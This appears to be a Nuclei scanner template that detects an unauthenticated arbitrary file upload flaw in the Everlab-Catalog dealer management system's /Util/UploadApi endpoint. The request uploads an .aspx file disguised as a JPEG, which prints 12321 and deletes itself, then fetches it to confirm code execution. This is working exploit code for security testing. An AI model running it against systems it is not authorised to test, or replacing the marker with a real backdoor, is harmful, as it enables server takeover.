id: Everlab-Catalog-UploadApi-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: Everlab-Catalog经销商管理系统 /Util/UploadApi接口处存在任意文件上传漏洞，未经授权的攻击者可上传任意后门文件，进而控制整个服务器。
  reference:
    - http://kpanda.wiki/#/Vulnhub/E3-1Everlab-Catalog-%E7%BB%8F%E9%94%80%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=e3-1everlab-catalog-%e7%bb%8f%e9%94%80%e5%95%86%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
  tags: tags
http:
  - raw:
      - |-
        POST /Util/UploadApi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
        Upgrade-Insecure-Requests: 1
        Content-Length: 206

        --59229605f98b8cf290a7b8908b34616b
        Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
        Content-Type: image/jpeg

        <%@Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
        --59229605f98b8cf290a7b8908b34616b--
      - |+
        GET /{{filepath}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '12321'
    extractors:
      - type: regex
        name: filepath
        internal: true
        part: body
        regex:
          - '/upload/\d{4}/\d{2}/\d{2}/[a-zA-Z0-9-]+\.aspx'         